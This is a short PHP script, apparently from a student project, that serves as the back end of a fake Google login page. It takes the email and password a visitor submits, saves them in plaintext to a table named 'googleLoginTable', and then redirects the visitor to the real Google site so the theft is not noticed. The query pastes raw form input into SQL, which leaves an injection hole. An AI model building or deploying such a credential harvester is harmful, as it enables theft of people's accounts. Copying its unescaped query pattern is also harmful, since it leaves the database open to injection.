<?php
    include_once 'projectIT220MySQL.php';
    // session_start();

    $email = $_POST['email'];
    $_SESSION['email'] = $email;

    $userpassword = $_POST['userpassword'];
    $_SESSION['userpassword'] = $userpassword;

    // echo "<p>This is Session: </p>";
    // echo $_SESSION['email'];
    // echo $_SESSION['userpassword'];

    // echo "<p>$checkIn, $checkOut, $aNn, $nAt, and $poID INSIDE STAY CHECK</p>";

    // echo "<p>Variables: $name, $last, $ID, $phoneNumber, $phoneNumber, $eAddress, $options</p>";

    // From here
    $sql = "INSERT INTO `googleLoginTable`(`email`, `password`) VALUES ('$email','$userpassword');";
    if (mysqli_query($con, $sql))
    {
        echo '<script>alert("Logged In");</script>';
        header("Location: https://www.google.com", true, 301);  
    }
    else
    {
        echo '<script>alert("ERROR. You will be redirected to main page");</script>';
        header("Location: https://www.google.com/gmail/about/", true, 301);  
    }
?>
